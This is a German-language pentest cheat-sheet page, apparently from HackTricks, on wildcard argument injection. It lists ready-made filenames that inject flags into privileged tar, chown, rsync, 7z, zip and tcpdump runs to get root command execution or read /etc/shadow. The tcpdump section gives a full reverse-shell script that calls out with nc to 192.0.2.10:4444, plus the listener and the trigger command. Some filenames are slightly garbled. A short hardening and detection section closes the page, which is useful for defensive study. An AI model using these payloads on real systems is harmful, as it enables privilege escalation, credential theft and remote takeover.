# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (auch *glob*) **Argumentinjektion** tritt auf, wenn ein privilegiertes Skript ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einem nicht zitierten Wildcard wie `*` ausführt. 
> Da die Shell das Wildcard **vor** der Ausführung des Binaries erweitert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen erstellen, die mit `-` beginnen, sodass sie als **Optionen anstelle von Daten** interpretiert werden, wodurch willkürliche Flags oder sogar Befehle effektiv geschmuggelt werden.
> Diese Seite sammelt die nützlichsten Primitiven, aktuelle Forschungen und moderne Erkennungen für 2023-2025.

## chown / chmod

Sie können **den Besitzer/die Gruppe oder die Berechtigungsbits einer beliebigen Datei kopieren**, indem Sie das `--reference`-Flag missbrauchen:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wenn root später etwas wie folgendes ausführt:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` wird injiziert, wodurch *alle* übereinstimmenden Dateien den Besitz/die Berechtigungen von `/root/secret``file` erben.

*PoC & Tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).
Siehe auch das klassische DefenseCode-Papier für Details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Führen Sie beliebige Befehle aus, indem Sie die **Checkpoint**-Funktion missbrauchen:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sobald root z.B. `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.

### bsdtar / macOS 14+

Das Standard-`tar` auf aktuellen macOS (basierend auf `libarchive`) implementiert *nicht* `--checkpoint`, aber Sie können dennoch eine Codeausführung mit dem **--use-compress-program**-Flag erreichen, das es Ihnen ermöglicht, einen externen Kompressor anzugeben.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wenn ein privilegiertes Skript `tar -cf backup.tar *` ausführt, wird `/bin/sh` gestartet.

---

## rsync

`rsync` ermöglicht es Ihnen, die Remote-Shell oder sogar die Remote-Binärdatei über Befehlszeilenflags zu überschreiben, die mit `-e` oder `--rsync-path` beginnen:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root später das Verzeichnis mit `rsync -az * backup:/srv/` archiviert, wird die injizierte Flagge deine Shell auf der Remote-Seite starten.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync`-Modus).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Skript *defensiv* das Wildcard mit `--` voranstellt (um die Optionsanalyse zu stoppen), unterstützt das 7-Zip-Format **Dateiliste-Dateien**, indem der Dateiname mit `@` vorangestellt wird. Die Kombination mit einem Symlink ermöglicht es dir, *willkürliche Dateien zu exfiltrieren*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas wie Folgendes ausführt:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen und wird abbrechen, **während es den Inhalt auf stderr ausgibt**.

---

## zip

`zip` unterstützt das Flag `--unzip-command`, das *wörtlich* an die System-Shell übergeben wird, wenn das Archiv getestet wird:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injiziere das Flag über einen gestalteten Dateinamen und warte darauf, dass das privilegierte Backup-Skript `zip -T` (Archiv testen) auf der resultierenden Datei aufruft.

---

## Zusätzliche Binärdateien, die anfällig für Wildcard-Injection sind (2023-2025 Schnellübersicht)

Die folgenden Befehle wurden in modernen CTFs und realen Umgebungen missbraucht. Die Payload wird immer als *Dateiname* in einem beschreibbaren Verzeichnis erstellt, das später mit einem Wildcard verarbeitet wird:

| Binärdatei | Flag zum Missbrauch | Effekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → beliebiges `@file` | Dateiinhalt lesen |
| `flock` | `-c <cmd>` | Befehl ausführen |
| `git`   | `-c core.sshCommand=<cmd>` | Befehlsausführung über git über SSH |
| `scp`   | `-S <cmd>` | Beliebiges Programm anstelle von ssh starten |

Diese Primitiven sind weniger verbreitet als die *tar/rsync/zip* Klassiker, aber es lohnt sich, sie bei der Jagd zu überprüfen.

---

## tcpdump-Rotationshaken (-G/-W/-z): RCE über argv-Injection in Wrappers

Wenn eine eingeschränkte Shell oder ein Anbieter-Wrap einen `tcpdump`-Befehl erstellt, indem sie benutzerkontrollierte Felder (z. B. ein "Dateiname"-Parameter) ohne strikte Anführungszeichen/Validierung verknüpft, kannst du zusätzliche `tcpdump`-Flags schmuggeln. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Anzahl der Dateien begrenzen) und `-z <cmd>` (Post-Rotate-Befehl) führt zu beliebiger Befehlsausführung als der Benutzer, der tcpdump ausführt (oft root auf Geräten).

Voraussetzungen:

- Du kannst `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Der Wrapper bereinigt keine Leerzeichen oder mit `-` beginnende Tokens im Dateinamenfeld.

Klassisches PoC (führt ein Reverse-Shell-Skript von einem beschreibbaren Pfad aus):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` zwingt eine sofortige Rotation nach dem ersten übereinstimmenden Paket.
- `-z <cmd>` führt den Post-Rotate-Befehl einmal pro Rotation aus. Viele Builds führen `<cmd> <savefile>` aus. Wenn `<cmd>` ein Skript/Interpreter ist, stellen Sie sicher, dass die Argumentbehandlung mit Ihrem Payload übereinstimmt.

No-removable-media Varianten:

- Wenn Sie eine andere Primitive zum Schreiben von Dateien haben (z. B. einen separaten Befehlswrapper, der die Umleitung von Ausgaben ermöglicht), legen Sie Ihr Skript in einen bekannten Pfad und triggern Sie `-z /bin/sh /path/script.sh` oder `-z /path/script.sh`, je nach Plattformsemantik.
- Einige Vendor-Wrappers rotieren zu vom Angreifer kontrollierbaren Standorten. Wenn Sie den rotierten Pfad beeinflussen können (symlink/verzeichnis traversal), können Sie `-z` steuern, um Inhalte auszuführen, die Sie vollständig kontrollieren, ohne externe Medien.

Hardening-Tipps für Anbieter:

- Geben Sie niemals benutzerkontrollierte Zeichenfolgen direkt an `tcpdump` (oder ein beliebiges Tool) ohne strenge Allowlists weiter. Zitieren und validieren.
- Setzen Sie die `-z`-Funktionalität in Wrappers nicht aus; führen Sie tcpdump mit einer festen sicheren Vorlage aus und verbieten Sie zusätzliche Flags vollständig.
- Reduzieren Sie die tcpdump-Berechtigungen (cap_net_admin/cap_net_raw nur) oder führen Sie es unter einem dedizierten unprivilegierten Benutzer mit AppArmor/SELinux-Einschränkung aus.


## Detection & Hardening

1. **Deaktivieren Sie die Shell-Gloßierung** in kritischen Skripten: `set -f` (`set -o noglob`) verhindert die Wildcard-Erweiterung.
2. **Zitieren oder Escapen** Sie Argumente: `tar -czf "$dst" -- *` ist *nicht* sicher — bevorzugen Sie `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Explizite Pfade**: Verwenden Sie `/var/www/html/*.log` anstelle von `*`, damit Angreifer keine Geschwisterdateien erstellen können, die mit `-` beginnen.
4. **Minimalprivileg**: Führen Sie Backup-/Wartungsjobs nach Möglichkeit als unprivilegiertes Dienstkonto anstelle von root aus.
5. **Überwachung**: Die vorgefertigte Regel von Elastic *Potential Shell via Wildcard Injection* sucht nach `tar --checkpoint=*`, `rsync -e*` oder `zip --unzip-command`, die sofort von einem Shell-Kindprozess gefolgt werden. Die EQL-Abfrage kann für andere EDRs angepasst werden.

---

## References

* Elastic Security – Regel *Potential Shell via Wildcard Injection Detected* (zuletzt aktualisiert 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (18. Dez 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
